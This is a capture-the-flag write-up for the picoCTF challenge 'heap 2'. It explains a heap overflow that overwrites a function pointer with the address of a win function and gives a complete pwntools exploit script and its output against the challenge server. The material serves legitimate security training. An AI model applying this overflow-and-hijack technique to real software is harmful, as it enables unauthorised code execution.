# [Pwn] heap 2

## 💡 Challenge Description

> *Can you handle function pointers?*

## 🔒 ELF Properties

```
rydzze ~ ❯ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=d5184d264ae0c1259ba3bb7a1e20fc348b4274b0, for GNU/Linux 3.2.0, with debug_info, not stripped

rydzze ~ ❯ checksec --file=chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   51 Symbols        No    0               2               chall
```

## ✨ Walkthrough

```c
void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }
```

Once again, they have changed the program, specifically both `win` and `check_win` functions and this time we have to overwrite the value of `x` variable with the address of `win` function. Thus, when we call the `check_win` function, it will call the `win` function and print out the flag.

## ⚙ Full Script

```py
from pwn import *
elf = context.binary = ELF('./chall')

# p = process('./chall')
p = remote("mimas.picoctf.net", 52831)

WIN_ADDR = elf.sym['win']
log.success(f"WIN_ADDR: {hex(WIN_ADDR)}")

p.sendlineafter(b"Enter your choice: ", b'2')

payload = b'A' * 32 + p64(WIN_ADDR)
p.sendlineafter(b"Data for buffer: ", payload)

p.sendlineafter(b"Enter your choice: ", b'4')

flag = p.recvall(timeout=1).strip()
log.success(f"Flag: {flag.decode()}")

p.close()
```

## 🛠 Exploit

```
rydzze ~ ❯ python solve.py
[*] '/home/rydzze/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
[+] Opening connection to mimas.picoctf.net on port 52831: Done
[+] WIN_ADDR: 0x4011a0
[+] Receiving all data: Done (42B)
[*] Closed connection to mimas.picoctf.net port 52831
[+] Flag: picoCTF{REDACTED}
```